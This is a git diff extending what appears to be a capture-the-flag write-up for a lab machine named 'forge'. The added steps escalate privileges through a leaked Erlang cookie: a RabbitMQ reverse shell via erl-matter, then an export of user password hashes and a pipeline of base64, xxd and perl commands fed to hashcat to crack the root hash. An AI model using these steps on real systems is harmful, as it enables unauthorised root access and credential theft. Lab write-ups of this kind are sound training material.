@@ -164,12 +164,63 @@ Progress: 23070 / 23075 (99.98%)
 
 + Using script `Linpeas.sh` to scan vectors privilege, we find the potential file:
 
+![alt text](image-14.png)
 
+--> Cookie of service `Rabbitmq`. With the erlang cookie, we can access intital Rabbit through RCE.
 
----
++ We use script [Erl-Matter](https://github.com/gteissier/erl-matter) to create revershell access intial service `Rabbitmq`:
 
-## Conclusion
-Reflect on the techniques learned and provide recommendations for securing similar environments.
+![alt text](image-15.png)
 
++ Research `Rabbitmq` and find how to use service --> Read more about using service in Document [Rabbitmq](https://www.rabbitmq.com/docs/cli).
 
++ If we recive the error when running command:
+```
+11:07:58.049 [error] Cookie file ./.erlang.cookie must be accessible by owner only
+```
+--> We need to grant owner permission `chmod 600 <erlang.cookie>` and run command agin.
+
++ Using `rabbitmqctl` to list the available user with command:
+
+```
+rabbitmq@forge:~$ rabbitmqctl list_users
+rabbitmqctl list_users
+Listing users ...
+user    tags
+The password for the root user is the SHA-256 hashed value of the RabbitMQ root user's password. Please don't attempt to crack SHA-256.        []
+root    [administrator]
+```
+--> The user `root` is available and we can retrive the password but we can't crack the password_hash.
+
++ Using `Schema Definition Export` to export user data contains password hashes as well as password hashing function information.
+
+```
+rabbitmq@forge:~/schema$ rabbitmqctl export_definitions rabbit.json
+rabbitmqctl export_definitions rabbit.json
+Exporting definitions in JSON to a file at "rabbit.json" ...
+```
+
+```
+rabbitmq@forge:~$ cat rabbit.json
+cat rabbit.json
+{"bindings":[],"exchanges":[],"global_parameters":[{"name":"cluster_name","value":"rabbit@forge"}],"parameters":[],"permissions":[{"configure":".*","read":".*","user":"root","vhost":"/","write":".*"}],"policies":[],"queues":[{"arguments":{},"auto_delete":false,"durable":true,"name":"tasks","type":"classic","vhost":"/"}],"rabbit_version":"3.9.13","rabbitmq_version":"3.9.13","topic_permissions":[{"exchange":"","read":".*","user":"root","vhost":"/","write":".*"}],"users":[{"hashing_algorithm":"rabbit_password_hashing_sha256","limits":{},"name":"The password for the root user is the SHA-256 hashed value of the RabbitMQ root user's password. Please don't attempt to crack SHA-256.","password_hash":"vyf4qvKLpShONYgEiNc6xT/5rLq+23A2RuuhEZ8N10kyN34K","tags":[]},{"hashing_algorithm":"rabbit_password_hashing_sha256","limits":{},"name":"root","password_hash":"49e6hSldHRaiYX329+ZjBSf/Lx67XEOz9uxhSBHtGU+YBzWF","tags":["administrator"]}],"vhosts":[{"limits":[],"metadata":{"description":"Default virtual host","tags":[]},"name":"/"}]}
+```
+--> We've gotten account `root:9e6hSldHRaiYX329+ZjBSf/Lx67XEOz9uxhSBHtGU+YBzWF`.
+
++ We can read more the information [Algorithm Hash Password](https://www.rabbitmq.com/docs/passwords#this-is-the-algorithm).
+
++ Using [Password Cracking](https://github.com/qkaiser/cottontail/issues/27#issuecomment-1608711032) to convert and crack the password:
+
+```
+echo 49e6hSldHRaiYX329+ZjBSf/Lx67XEOz9uxhSBHtGU+YBzWF | base64 -d | xxd -pr -c128 | perl -pe 's/^(.{8})(.*)/$2:$1/' > hash.txt
+hashcat -m 1420 --hex-salt hash.txt /usr/share/wordlists/rockyou.txt
+```
+
+![alt text](image-16.png)
+
++ We have the hash: `295d1d16a2617df6f7e6630527ff2f1ebb5c43b3f6ec614811ed194f98073585:e3d7ba85`.
+
++ Using the hash to login user `root`:
+
+![alt text](image-17.png)
 ---
